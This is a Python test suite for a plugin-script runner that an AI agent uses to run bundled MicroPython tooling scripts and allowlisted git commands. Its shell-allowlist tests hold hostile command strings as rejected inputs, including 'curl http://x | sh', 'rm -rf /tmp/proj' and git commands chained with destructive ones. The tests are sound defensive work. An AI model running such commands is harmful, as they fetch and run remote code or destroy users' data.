"""Tests for serve.py's generic V0 plugin-script runner (run with: python test_serve.py).

Hermetic: resolution is checked against the real vendored submodule; execution is
checked with an injected fake runner (no venv, no real subprocess).
"""
import inspect
import os
import pathlib
import sys
import tempfile
import types

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import serve  # noqa: E402


def _fake_proc(stdout="", stderr="", returncode=0):
    return types.SimpleNamespace(stdout=stdout, stderr=stderr, returncode=returncode)


def _shim_with(record):
    def runner(cmd, **kwargs):
        record.append({"cmd": cmd, "kwargs": kwargs})
        return _fake_proc(stdout=record_stdout[0], returncode=record_rc[0])
    return serve.Shim(runner=runner)


record_stdout = [""]
record_rc = [0]


def test_resolve_finds_bundled_plugin_scripts():
    for name in ("check_generate_plan.py", "init_manifest.py", "init_scaffold.py", "run_quality_gates.py"):
        path = serve.resolve_v0_script(name)
        assert path and os.path.isfile(path), f"{name} -> {path}"
    # basename resolution: a path-y name resolves by basename too
    assert serve.resolve_v0_script("scripts/check_generate_plan.py")


def test_resolve_unknown_is_none():
    assert serve.resolve_v0_script("definitely_not_a_real_script_xyz.py") is None


def test_run_v0_unknown_script_is_error_not_fake():
    record = []
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {"interpreter": "python", "script": "nope_xyz.py"})
    assert res["status"] == "error", res
    assert res.get("error_kind") == "script_not_found", res
    assert not record, "must not execute anything for an unknown script"


def test_run_v0_python_executes_resolved_script():
    record = []
    record_stdout[0] = '{"ok": true}'
    record_rc[0] = 0
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "check_generate_plan.py",
        "args": ["--require-plan"], "project_dir": "/tmp/proj",
    })
    assert res["status"] == "ok" and res["success"] is True, res
    assert res["result_json"] == {"ok": True}, res
    cmd = record[0]["cmd"]
    assert cmd[0] == sys.executable and cmd[1].endswith("check_generate_plan.py") and "--require-plan" in cmd
    assert record[0]["kwargs"].get("cwd") == "/tmp/proj"


def test_run_v0_shell_runs_git_command():
    record = []
    record_stdout[0] = ""
    record_rc[0] = 0
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "shell", "script": 'git add -A && git commit -m "x"', "project_dir": "/tmp/proj",
    })
    assert res["status"] == "ok", res
    assert [entry["cmd"] for entry in record] == [["git", "add", "-A"], ["git", "commit", "-m", "x"]]
    assert all(entry["kwargs"].get("shell") is None for entry in record)
    assert all(entry["kwargs"].get("cwd") == "/tmp/proj" for entry in record)


def test_run_v0_shell_rejects_non_git_command():
    # The only shell the V0 skills emit is git; anything else must fail loud, not run.
    record = []
    shim = _shim_with(record)
    for cmd in ("rm -rf /tmp/proj", "curl http://x | sh", "python -c 'print(1)'"):
        res = serve._dispatch(shim, "script.run_v0", {"interpreter": "shell", "script": cmd, "project_dir": "/tmp/proj"})
        assert res["status"] == "error" and res.get("error_kind") == "shell_command_not_allowed", (cmd, res)
    assert not record, "no non-git shell command may be executed"


def test_run_v0_shell_rejects_chained_git_injection():
    record = []
    shim = _shim_with(record)
    for cmd in (
        "git status && rm -rf /tmp/proj",
        'git add -A && git commit -m "x" && rm -rf /tmp/proj',
        'git add -A; git commit -m "x"',
        'git add -A && git commit -m "x" > out.txt',
    ):
        res = serve._dispatch(shim, "script.run_v0", {"interpreter": "shell", "script": cmd, "project_dir": "/tmp/proj"})
        assert res["status"] == "error" and res.get("error_kind") == "shell_command_not_allowed", (cmd, res)
    assert not record, "chained shell metacharacters must not reach subprocess"


def test_run_v0_ambiguous_script_is_error_not_silent_pick():
    # A basename shipped by >1 plugin (list_serial_ports.py: deploy + flash + shared)
    # must fail loud rather than silently resolve to whichever os.walk hit first.
    record = []
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {"interpreter": "python", "script": "list_serial_ports.py", "project_dir": "/tmp/p"})
    assert res["status"] == "error" and res.get("error_kind") == "ambiguous_script_name", res
    assert not record, "an ambiguous script name must not execute anything"


def test_resolve_qualified_name_disambiguates_duplicate_basename():
    # list_serial_ports.py ships in 3 plugins -> the BARE name is ambiguous, but a
    # plugin-qualified name resolves to exactly that plugin's copy (no silent pick).
    assert serve.resolve_v0_script("list_serial_ports.py") is None
    deploy = serve.resolve_v0_script("upy-deploy-plugin/list_serial_ports.py")
    assert deploy and "upy-deploy-plugin" in deploy.replace("\\", "/"), deploy
    flash = serve.resolve_v0_script("upy-flash-mpy-firmware-plugin/list_serial_ports.py")
    assert flash and "upy-flash-mpy-firmware-plugin" in flash.replace("\\", "/"), flash
    assert deploy != flash


def test_run_v0_qualified_name_executes_the_right_plugin_copy():
    record = []
    record_stdout[0] = ""
    record_rc[0] = 0
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "upy-deploy-plugin/list_serial_ports.py", "project_dir": "/tmp/p",
    })
    assert res["status"] == "ok", res
    assert record and "upy-deploy-plugin" in record[0]["cmd"][1].replace("\\", "/"), record


def test_ambiguous_error_lists_candidate_plugin_qualified_names():
    # The model gets stuck on a bare duplicate name unless the error tells it which
    # plugin-qualified names to retry with.
    record = []
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {"interpreter": "python", "script": "list_serial_ports.py", "project_dir": "/tmp/p"})
    assert res.get("error_kind") == "ambiguous_script_name", res
    cands = res.get("candidates") or []
    assert any("upy-deploy-plugin" in c for c in cands), res
    assert any("upy-flash-mpy-firmware-plugin" in c for c in cands), res
    # every listed candidate must round-trip: resolving it picks a single script.
    for c in cands:
        assert serve.resolve_v0_script(c) is not None, c


def test_resolver_excludes_pre_v0_skills():
    # init_scaffold.py exists in BOTH upy-scaffold (old) and upy-scaffold-plugin (V0);
    # only the -plugin copy is indexed, so the bare name resolves uniquely.
    path = serve.resolve_v0_script("init_scaffold.py")
    assert path and "-plugin" in path.replace("\\", "/"), path
    assert len(serve._v0_script_candidates("init_scaffold.py")) == 1


def test_resolver_disambiguates_shared_basenames_by_active_phase():
    # gen-driver/wiring/diagram are now served, so their scripts ARE indexed. A few basenames
    # collide with the core plugins (update_session_state.py in generate + gen-driver;
    # run_on_device.py in scaffold + gen-driver). Without a phase these must be AMBIGUOUS
    # (fail-loud, never a silent os.walk-order pick); the ACTIVE PHASE resolves each to that
    # phase's own copy, so the model never has to qualify. Force the dev-fallback root (the full
    # submodule) so this is deterministic regardless of any stale packaged-subset <ext>/third_party.
    here = os.path.dirname(os.path.abspath(__file__))
    dev_root = os.path.abspath(os.path.join(here, "..", "..", "..", "third_party", "MicroPython_Skills"))
    assert os.path.isdir(os.path.join(dev_root, "upy-gen-driver-plugin")), dev_root
    orig_root, orig_index = serve.scripts_root, serve._V0_SCRIPT_INDEX
    serve.scripts_root, serve._V0_SCRIPT_INDEX = (lambda: dev_root), None
    try:
        # No phase -> ambiguous (the two colliding copies), so _run_v0_script fails loud.
        assert len(serve._v0_script_candidates("update_session_state.py")) == 2
        assert len(serve._v0_script_candidates("run_on_device.py")) == 2
        # The active phase disambiguates to that phase's own copy (mutation: drop the phase branch
        # in _v0_script_candidates -> these return 2 and the assert fails).
        for name, phase, served_dir in (
            ("update_session_state.py", "upy-generate-plugin", "upy-generate-plugin"),
            ("update_session_state.py", "upy-gen-driver-plugin", "upy-gen-driver-plugin"),
            ("run_on_device.py", "upy-scaffold-plugin", "upy-scaffold-plugin"),
            ("run_on_device.py", "upy-gen-driver-plugin", "upy-gen-driver-plugin"),
        ):
            cands = serve._v0_script_candidates(name, phase)
            assert len(cands) == 1 and served_dir + "/" in cands[0].replace("\\", "/") + "/", (name, phase, cands)
        # A gen-driver-only script now resolves (single copy, no phase needed).
        assert len(serve._v0_script_candidates("finalize_phase_complete.py")) == 1
        # An explicit-but-wrong qualifier is NOT silently overridden by the phase: it stays
        # ambiguous so the model sees its mistake. Mutation: drop the `not qualifier` guard ->
        # the phase resolves it to 1 and this fails.
        assert len(serve._v0_script_candidates("upy-nope-plugin/update_session_state.py", "upy-generate-plugin")) == 2
    finally:
        serve.scripts_root, serve._V0_SCRIPT_INDEX = orig_root, orig_index


def test_toolchain_spec_scripts_are_indexed():
    # The wiring/diagram SKILLs invoke upy-project-gen-toolchain-spec/scripts/validate_json.py by name
    # (the SKILL command carries an absolute G:/ prefix). Without indexing that dir it is script_not_found
    # on every live wiring/diagram run. Force the dev-root submodule for determinism. Mutation: drop the dir
    # from _V0_PLUGIN_DIRS or the filter clause -> 0 candidates and these fail.
    here = os.path.dirname(os.path.abspath(__file__))
    dev_root = os.path.abspath(os.path.join(here, "..", "..", "..", "third_party", "MicroPython_Skills"))
    assert os.path.isdir(os.path.join(dev_root, "upy-project-gen-toolchain-spec", "scripts")), dev_root
    orig_root, orig_index = serve.scripts_root, serve._V0_SCRIPT_INDEX
    serve.scripts_root, serve._V0_SCRIPT_INDEX = (lambda: dev_root), None
    try:
        assert len(serve._v0_script_candidates("validate_json.py")) == 1
        # basename resolution tolerates the SKILL's absolute G:/ spelling and the scripts/ spelling
        assert len(serve._v0_script_candidates("G:/skills/upy-project-gen-toolchain-spec/scripts/validate_json.py")) == 1
        assert len(serve._v0_script_candidates("scripts/validate_json.py", "upy-wiring-plugin")) == 1
    finally:
        serve.scripts_root, serve._V0_SCRIPT_INDEX = orig_root, orig_index


def test_resolver_treats_scripts_prefix_as_bare_and_qualifier_as_segment():
    # The served SKILL.md prose invokes scripts by their `scripts/<name>.py` spelling
    # (upy-generate-plugin/SKILL.md:154,233 -> scripts/update_session_state.py). The
    # plugin-internal `scripts/` dir must NOT be read as a plugin qualifier: every copy
    # lives under .../scripts/, so a substring/`scripts`-qualifier match keeps BOTH copies
    # and skips the phase branch -> ambiguous_script_name, regressing the LIVE generate flow.
    # A real qualifier must match a whole plugin-dir SEGMENT, not any substring (else
    # "driver/..." matches "gen-driver" and silently picks the wrong copy).
    here = os.path.dirname(os.path.abspath(__file__))
    dev_root = os.path.abspath(os.path.join(here, "..", "..", "..", "third_party", "MicroPython_Skills"))
    assert os.path.isdir(os.path.join(dev_root, "upy-gen-driver-plugin")), dev_root
    orig_root, orig_index = serve.scripts_root, serve._V0_SCRIPT_INDEX
    serve.scripts_root, serve._V0_SCRIPT_INDEX = (lambda: dev_root), None
    try:
        # SKILL spelling: `scripts/<name>` is the phase's own copy, same as the bare name.
        for name, phase, served_dir in (
            ("scripts/update_session_state.py", "upy-generate-plugin", "upy-generate-plugin"),
            ("scripts/run_on_device.py", "upy-scaffold-plugin", "upy-scaffold-plugin"),
            ("scripts/run_on_device.py", "upy-gen-driver-plugin", "upy-gen-driver-plugin"),
        ):
            cands = serve._v0_script_candidates(name, phase)
            assert len(cands) == 1 and served_dir + "/" in cands[0].replace("\\", "/") + "/", (name, phase, cands)
        # A plugin-internal `scripts/` prefix with NO phase stays ambiguous (fail-loud), like the bare name.
        assert len(serve._v0_script_candidates("scripts/update_session_state.py")) == 2
        # An explicit real plugin qualifier still wins.
        cands = serve._v0_script_candidates("upy-gen-driver-plugin/update_session_state.py", "upy-generate-plugin")
        assert len(cands) == 1 and "upy-gen-driver-plugin/" in cands[0].replace("\\", "/"), cands
        # A partial-substring qualifier must NOT silently pick a copy: "driver" is a substring of
        # "gen-driver" but not a whole segment -> stays ambiguous, not a wrong single pick.
        assert len(serve._v0_script_candidates("driver/update_session_state.py", "upy-generate-plugin")) == 2
    finally:
        serve.scripts_root, serve._V0_SCRIPT_INDEX = orig_root, orig_index


def test_run_v0_failed_script_reports_nonzero_not_fake_success():
    record = []
    record_stdout[0] = ""
    record_rc[0] = 1
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {"interpreter": "python", "script": "run_quality_gates.py", "project_dir": "/tmp/p"})
    assert res["status"] == "ok" and res["success"] is False and res["exit_code"] == 1, res


def test_quality_gate_run_removes_firmware_tools_first(tmp_path):
    proj = tmp_path / "proj"
    (proj / "firmware" / "tools").mkdir(parents=True)
    (proj / "firmware" / "tools" / "flash_device.py").write_text("import subprocess\n")
    (proj / "firmware").joinpath("main.py").write_text("print('hi')\n")

    serve.prepare_quality_gate_project(str(proj))

    assert not (proj / "firmware" / "tools").exists()
    assert (proj / "firmware" / "main.py").exists()


def test_prepare_quality_gate_project_is_idempotent_and_safe_without_tools(tmp_path):
    proj = tmp_path / "proj"
    (proj / "firmware").mkdir(parents=True)
    serve.prepare_quality_gate_project(str(proj))  # no tools dir -> no-op, no raise


def test_run_v0_dispatch_removes_firmware_tools_for_quality_gates(tmp_path):
    """Dispatch-level guard: the REAL caller shape (script.run_v0 with a
    project_dir param and no --project-dir arg, mirroring test_serve.py:165)
    must trigger the cleanup."""
    proj = tmp_path / "proj"
    (proj / "firmware" / "tools").mkdir(parents=True)
    (proj / "firmware" / "tools" / "flash_device.py").write_text("import subprocess\n")
    record = []
    record_stdout[0] = ""
    record_rc[0] = 0
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {"interpreter": "python", "script": "run_quality_gates.py", "project_dir": str(proj)})
    assert res["status"] == "ok" and res["success"] is True, res
    assert not (proj / "firmware" / "tools").exists()


def _patch_mpremote(fn):
    # Swap serve._run_mpremote (a module helper the device fs ops call directly) for a
    # fake. Returns a restore() so each test leaves the module clean.
    orig = serve._run_mpremote
    serve._run_mpremote = fn
    return lambda: setattr(serve, "_run_mpremote", orig)


def test_device_fs_remove_dispatches_mpremote_rm():
    calls = []
    restore = _patch_mpremote(lambda args, **kw: (calls.append(list(args)) or _fake_proc(returncode=0)))
    try:
        res = serve._dispatch(_shim_with([]), "device.fs_remove", {"port": "COM3", "path": "/main.py"})
    finally:
        restore()
    assert res["status"] == "ok", res
    assert calls and calls[0][:5] == ["connect", "COM3", "resume", "fs", "rm"], calls
    assert "/main.py" in calls[0]


def test_device_fs_mkdir_is_idempotent_on_existing_dir():
    restore = _patch_mpremote(lambda args, **kw: _fake_proc(stderr="OSError: [Errno 17] EEXIST", returncode=1))
    try:
        res = serve._dispatch(_shim_with([]), "device.fs_mkdir", {"port": "COM3", "path": "/lib"})
    finally:
        restore()
    assert res["status"] == "ok", res  # an already-existing dir is success, not an error


def test_device_fs_mkdir_surfaces_a_real_error():
    restore = _patch_mpremote(lambda args, **kw: _fake_proc(stderr="could not open port", returncode=1))
    try:
        res = serve._dispatch(_shim_with([]), "device.fs_mkdir", {"port": "COM3", "path": "/lib"})
    finally:
        restore()
    assert res["status"] == "error", res


def test_device_copy_from_dispatches_mpremote_cp_with_remote_colon():
    calls = []
    restore = _patch_mpremote(lambda args, **kw: (calls.append(list(args)) or _fake_proc(returncode=0)))
    try:
        res = serve._dispatch(_shim_with([]), "device.copy_from", {"port": "COM3", "remote_path": "log.txt", "local_path": "/tmp/log.txt"})
    finally:
        restore()
    assert res["status"] == "ok", res
    assert ":log.txt" in calls[0], calls
    assert "/tmp/log.txt" in calls[0]


def test_device_list_files_drops_the_mpremote_ls_header():
    # `mpremote fs ls` echoes an "ls :" header line; it must not leak into the file list
    # as a spurious ":" / "ls" entry.
    stdout = "ls :\n        2061 boot.py\n         139 main.py\n           0 lib/\n"
    restore = _patch_mpremote(lambda args, **kw: _fake_proc(stdout=stdout, returncode=0))
    try:
        res = serve._dispatch(_shim_with([]), "device.list_files", {"port": "COM3"})
    finally:
        restore()
    assert res["status"] == "ok", res
    assert ":" not in res["files"] and "ls" not in res["files"], res
    assert "boot.py" in res["files"] and "main.py" in res["files"], res


def test_device_copy_from_creates_local_parent_dirs():
    # A device pull to a nested local path must create the parent dirs first, or mpremote
    # cp fails on a missing directory.
    import tempfile
    restore = _patch_mpremote(lambda args, **kw: _fake_proc(returncode=0))
    try:
        with tempfile.TemporaryDirectory() as d:
            nested = os.path.join(d, "logs", "run.txt")
            res = serve._dispatch(_shim_with([]), "device.copy_from", {"port": "COM3", "remote_path": "run.txt", "local_path": nested})
            assert res["status"] == "ok", res
            assert os.path.isdir(os.path.dirname(nested)), "parent dir must be created before the device pull"
    finally:
        restore()

def test_resolve_finds_the_maixpy_export_validator():
    # The Sipeed export SKILL invokes validate_maixpy_export.py by its bare name. Unless the plugin
    # dir is indexed here (and bundled by prepare-vsce), every export run fails script_not_found in
    # a packaged install while dev still works. Mutation: drop upy-maixpy-export-plugin from
    # _V0_PLUGIN_DIRS and this resolves to None.
    path = serve.resolve_v0_script("validate_maixpy_export.py")
    assert path and os.path.isfile(path), path
    assert "upy-maixpy-export-plugin" in path.replace("\\", "/"), path
    # Unique basename across the bundled plugins -> exactly one candidate, so no qualifier needed.
    assert len(serve._v0_script_candidates("validate_maixpy_export.py")) == 1


def test_maintenance_scripts_are_not_runnable_from_a_phase():
    # The upstream maintenance scripts fetch the live web and write to an arbitrary --out-dir with
    # no workspace containment. Indexing a plugin dir must NOT make them resolvable by bare name, or
    # one hallucinated script_run inside a network:false run fetches and writes outside the project.
    # Mutation: drop the _V0_MAINTENANCE_SCRIPTS filter and each of these resolves.
    for name in serve._V0_MAINTENANCE_SCRIPTS:
        assert serve.resolve_v0_script(name) is None, name
        assert serve._v0_script_candidates(name) == [], name
        # A plugin-qualified spelling must not smuggle one in either.
        assert serve.resolve_v0_script(f"upy-maixpy-export-plugin/{name}") is None, name
    # They really are on disk (the guard is the filter, not a missing file).
    assert os.path.isfile(os.path.join(serve.scripts_root(), "upy-maixpy-export-plugin", "scripts", "crawl_sipeed_maixpy_docs.py"))


def test_run_v0_shell_allows_the_read_only_git_forms_the_contract_needs():
    # The generate contract requires session_state.git_commit to record project HEAD, and a
    # fresh project needs `git init`. Refusing these stalled the phase.
    # `git init` is preceded by an is-inside-work-tree probe (see the nesting test below).
    # The fake runner answers "", i.e. not a work tree, so the init itself still runs.
    probe = ["git", "rev-parse", "--is-inside-work-tree"]
    for command, expected in (
        ("git rev-parse HEAD", [["git", "rev-parse", "HEAD"]]),
        ("git status --short", [["git", "status", "--short"]]),
        ("git init", [probe, ["git", "init"]]),
        (
            'git init && git add -A && git commit -m "generate: initial"',
            [probe, ["git", "init"], ["git", "add", "-A"], ["git", "commit", "-m", "generate: initial"]],
        ),
    ):
        record = []
        record_stdout[0] = ""
        record_rc[0] = 0
        shim = _shim_with(record)
        res = serve._dispatch(shim, "script.run_v0", {
            "interpreter": "shell", "script": command, "project_dir": "/tmp/proj",
        })
        assert res["status"] == "ok", (command, res)
        assert [entry["cmd"] for entry in record] == expected, command
        assert all(entry["kwargs"].get("shell") is None for entry in record), command


def test_run_v0_shell_skips_git_init_inside_an_existing_work_tree():
    # The folder the user opened is often a SUBDIRECTORY of their own repo
    # (repo/projects/my-blinky). `git init` there creates a nested repository and the parent
    # silently stops tracking that whole subtree. The contract only needs the project to be
    # in a work tree, and it already is, so the init must be skipped -- while the rest of
    # the chain still runs, or the phase stalls on a missing commit.
    record = []

    def runner(cmd, **kwargs):
        record.append({"cmd": cmd, "kwargs": kwargs})
        if cmd == ["git", "rev-parse", "--is-inside-work-tree"]:
            return _fake_proc(stdout="true\n")
        return _fake_proc(stdout="")

    shim = serve.Shim(runner=runner)
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "shell", "script": 'git init && git add -A && git commit -m "generate: initial"',
        "project_dir": "/tmp/proj",
    })
    assert res["status"] == "ok", res
    ran = [entry["cmd"] for entry in record]
    assert ["git", "init"] not in ran, f"git init must not run inside an existing work tree: {ran}"
    assert ["git", "add", "-A"] in ran and ["git", "commit", "-m", "generate: initial"] in ran, ran


def test_run_v0_shell_refusal_names_the_permitted_commands():
    # Without this the model only learned that its guess was wrong, so it kept guessing until
    # the phase ran out of turns. The message reaches it as the tool result's stderr.
    shim = _shim_with([])
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "shell", "script": "git log --oneline", "project_dir": "/tmp/proj",
    })
    assert res["error_kind"] == "shell_command_not_allowed"
    assert res["message"] == serve.ALLOWED_SHELL_COMMANDS_HINT
    assert "git rev-parse HEAD" in res["message"]
    # The refusal must not send the model to a route that does not exist. interpreter=python
    # resolves BUNDLED plugin scripts only, so "just use interpreter=python" would turn one
    # dead end into a second (script_not_found) for something like `python -m flake8`.
    assert "run_quality_gates.py" in res["message"], "name where linting actually happens"
    assert "not arbitrary modules" in res["message"], "do not imply a module route exists"


def test_allowed_shell_hint_cannot_lie():
    # The hint and the parser are built from one table, so a form cannot be advertised without
    # being runnable. A hint naming a command the shim then refuses would send the model into
    # a confident loop -- worse than no hint.
    for argv in serve._ALLOWED_SHELL_ARGV:
        command = " ".join(argv)
        assert command in serve.ALLOWED_SHELL_COMMANDS_HINT, command
        assert serve._parse_v0_shell_command(command) == [list(argv)], command
    assert serve._parse_v0_shell_command('git commit -m "x"') == [["git", "commit", "-m", "x"]]


def test_run_v0_shell_still_refuses_an_over_long_chain_and_a_disallowed_part():
    # Every part is validated on its own, so a permitted command cannot carry an unpermitted
    # one along by position, and the chain length is bounded.
    record = []
    shim = _shim_with(record)
    for cmd in (
        "git rev-parse HEAD && rm -rf /tmp/proj",
        # Every part here is individually PERMITTED, so this is refused purely on chain length.
        # Without an all-allowed case the bound is never exercised: a chain containing a
        # disallowed part is refused by the allowlist whatever the limit is.
        "git init && git init && git init && git init",
        "git commit -m ''",
        "git log",
    ):
        res = serve._dispatch(shim, "script.run_v0", {"interpreter": "shell", "script": cmd, "project_dir": "/tmp/proj"})
        assert res["status"] == "error" and res.get("error_kind") == "shell_command_not_allowed", (cmd, res)
    assert not record, "nothing may reach subprocess when any part is disallowed"


# Every test must be DEFINED above this block. A test defined below it is never bound when the
# file runs as a script, so this runner would print ALL PASS while silently skipping it.
# The scaffold SKILL keeps project_root=<session_root>/project unless the CALLER provides a
# root. We never did, so apply_scaffold built a second tree one level down while the model's
# file_operation writes landed at our root, and deploy and upload_ready read the wrong one.
def test_apply_scaffold_is_told_the_project_root():
    record = []
    record_stdout[0] = '{"status": "ok"}'
    record_rc[0] = 0
    shim = _shim_with(record)
    res = serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "apply_scaffold.py",
        "args": ["--session-dir", "."], "project_dir": "/tmp/proj",
    })
    assert res["status"] == "ok", res
    cmd = record[0]["cmd"]
    assert "--project-dir" in cmd, cmd
    assert cmd[cmd.index("--project-dir") + 1] == "/tmp/proj", cmd
    # the model's own args survive alongside it
    assert "--session-dir" in cmd, cmd


def test_check_session_state_is_told_the_project_root():
    # Same <session_dir>/project fallback, on the reading side (check_session_state.py:138).
    record = []
    record_stdout[0] = '{"status": "ok"}'
    record_rc[0] = 0
    shim = _shim_with(record)
    serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "check_session_state.py",
        "args": ["--session-dir", "."], "project_dir": "/tmp/proj",
    })
    cmd = record[0]["cmd"]
    assert cmd[cmd.index("--project-dir") + 1] == "/tmp/proj", cmd


def test_a_model_supplied_project_root_is_not_overridden():
    # argparse takes the LAST value, so appending over a deliberate choice would silently win.
    for supplied in (["--project-dir", "/tmp/elsewhere"], ["--project-dir=/tmp/elsewhere"]):
        record = []
        record_stdout[0] = '{"status": "ok"}'
        record_rc[0] = 0
        shim = _shim_with(record)
        serve._dispatch(shim, "script.run_v0", {
            "interpreter": "python", "script": "apply_scaffold.py",
            "args": list(supplied), "project_dir": "/tmp/proj",
        })
        cmd = record[0]["cmd"]
        assert cmd.count("--project-dir") + sum(1 for a in cmd if str(a).startswith("--project-dir=")) == 1, cmd
        assert "/tmp/proj" not in cmd, cmd


def test_session_chain_validate_is_told_the_project_root():
    # Same fallback again (session_chain_validate.py:199). Without our root it validates
    # <session_dir>/project, which does not exist -- and forbidden_project_artifacts() returns
    # [] for a missing directory, so the chain validator reported a clean green about a tree it
    # never looked at. A false green from a validator is worse than no validator.
    record = []
    record_stdout[0] = '{"status": "ok"}'
    record_rc[0] = 0
    shim = _shim_with(record)
    serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "session_chain_validate.py",
        "args": ["--session-dir", "."], "project_dir": "/tmp/proj",
    })
    cmd = record[0]["cmd"]
    assert cmd[cmd.index("--project-dir") + 1] == "/tmp/proj", cmd


def test_project_root_scripts_is_derived_from_the_scripts_not_from_memory():
    # _PROJECT_ROOT_SCRIPTS is a hand-written tuple of names, and a hand-written list is exactly
    # how session_chain_validate.py went missing from it -- silently, because the wrong-tree run
    # still exits 0. Derive the set from the scripts the resolver ACTUALLY indexes and fail when
    # the tuple drifts, so the next script with this fallback is caught here and not in a run.
    here = os.path.dirname(os.path.abspath(__file__))
    dev_root = os.path.abspath(os.path.join(here, "..", "..", "..", "third_party", "MicroPython_Skills"))
    assert os.path.isdir(dev_root), dev_root
    orig_root, orig_index = serve.scripts_root, serve._V0_SCRIPT_INDEX
    serve.scripts_root, serve._V0_SCRIPT_INDEX = (lambda: dev_root), None
    try:
        needs_root = set()
        for basename, paths in serve._build_v0_script_index().items():
            for path in paths:
                src = pathlib.Path(path).read_text(encoding="utf-8", errors="replace")
                # Declares the flag AND falls back to <session_dir>/project when it is absent.
                if '"--project-dir"' not in src:
                    continue
                if 'session_dir / "project"' in src or 'session_root / "project"' in src:
                    needs_root.add(basename)
    finally:
        serve.scripts_root, serve._V0_SCRIPT_INDEX = orig_root, orig_index
    assert needs_root == set(serve._PROJECT_ROOT_SCRIPTS), (
        f"bundled scripts that fall back to <session_dir>/project: {sorted(needs_root)}; "
        f"_PROJECT_ROOT_SCRIPTS: {sorted(serve._PROJECT_ROOT_SCRIPTS)}"
    )


def test_other_scripts_are_not_given_a_project_root_they_do_not_accept():
    # Only the scripts that fall back to <session_dir>/project get the flag; appending it
    # to a script whose argparse does not define it would turn a working call into an error.
    record = []
    record_stdout[0] = '{"status": "ok"}'
    record_rc[0] = 0
    shim = _shim_with(record)
    serve._dispatch(shim, "script.run_v0", {
        "interpreter": "python", "script": "check_generate_plan.py",
        "args": ["--require-plan"], "project_dir": "/tmp/proj",
    })
    assert "--project-dir" not in record[0]["cmd"], record[0]["cmd"]


if __name__ == "__main__":
    failures = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                # A test that takes `tmp_path` wants pytest's fixture. SUPPLY one (a fresh
                # dir per test, cleaned up after) rather than skipping: skipping printed
                # "ALL PASS" and exit 0 while the A3a firmware/tools-stripping gate was
                # never executed, which is a green light for code nobody ran. Any OTHER
                # signature is a real failure here, not something to pass over quietly.
                params = list(inspect.signature(fn).parameters)
                if params == ["tmp_path"]:
                    with tempfile.TemporaryDirectory() as tmp:
                        fn(pathlib.Path(tmp))
                elif params:
                    raise AssertionError(f"unsupported fixtures {params}; this runner only supplies tmp_path")
                else:
                    fn()
                print(f"PASS {name}")
            except Exception as exc:  # noqa: BLE001
                failures += 1
                print(f"FAIL {name}: {exc}")
    verdict = "ALL PASS" if not failures else f"{failures} FAILED"
    print(f"\n{verdict}")
    sys.exit(1 if failures else 0)
